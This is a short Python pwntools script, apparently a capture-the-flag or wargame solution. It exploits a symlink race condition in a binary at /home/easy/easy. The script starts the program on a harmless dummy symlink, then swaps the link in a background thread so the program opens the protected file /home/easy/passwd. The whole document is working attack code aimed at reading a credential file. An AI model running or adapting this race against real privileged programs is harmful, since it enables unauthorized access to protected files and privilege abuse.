import os
import time
import threading
from pwn import *

def change():
	os.system('ln -sf /home/easy/passwd star')

os.system('ln -sf /tmp/qwaz/dummy star')
p = process(['/home/easy/easy', '/tmp/qwaz/star'])
t = threading.Thread(target=change)
t.start()

os.system('ln -sf /home/easy/passwd star')
p.interactive()
